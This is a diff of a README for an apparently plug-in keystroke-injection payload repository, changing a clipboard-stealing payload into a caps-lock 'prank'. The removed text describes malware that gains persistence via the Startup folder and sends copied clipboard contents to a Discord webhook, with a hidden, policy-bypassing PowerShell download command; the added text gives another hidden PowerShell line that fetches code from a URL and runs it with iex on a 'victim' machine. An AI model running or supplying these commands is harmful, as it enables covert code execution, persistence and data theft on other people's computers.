@@ -1,8 +1,6 @@
-<img src="https://github.com/atomiczsec/My-Payloads/blob/main/Assets/caw.png" width="200">
-
 <h1 align="center">
   <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+;Copy+And+Waste!+😈&center=true&size=30">
+    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+;cApS+Troll+😈&center=true&size=30">
   </a>
 </h1>
 
@@ -19,24 +17,13 @@
   </ol>
 </details>
 
-# Copy-And-Waste
+# cApS-Troll
 
-A payload to exfiltrate clipboard contents
+This payload is meant to prank your victim with TURNING on AND off CAPS LOCK
 
 ## Description
 
-This payload uses iwr to download 2 files 
-* I.bat
-* c.ps1
-
-**I.bat** is downloaded to the startup folder to maintain persistance and execute c.ps1 on reboot/startup
-
-**c.ps1** will sit in AppData\Roaming folder, waiting for a Ctrl + C or Ctrl + X click 
-
-Then the contents will then be sent to the discord webhook for viewing pleasure
-
-For killing the script press both Ctrl buttons at the same time [It will resume at reboot]
-
+This payload is meant to prank your victim with TURNING on AND off CAPS LOCK
 
 ## Getting Started
 
@@ -51,9 +38,10 @@ For killing the script press both Ctrl buttons at the same time [It will resume 
 ### Executing program
 
 * Plug in your device
+* Define the `DEFINE TARGET_URL example.com`
 * Device will download both files and place them in proper directories to then run the script
 ```
-powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""
+powershell -w h -NoP -NonI -ep Bypass $pl = iwr TARGET_URL dl=1; iex $pl
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
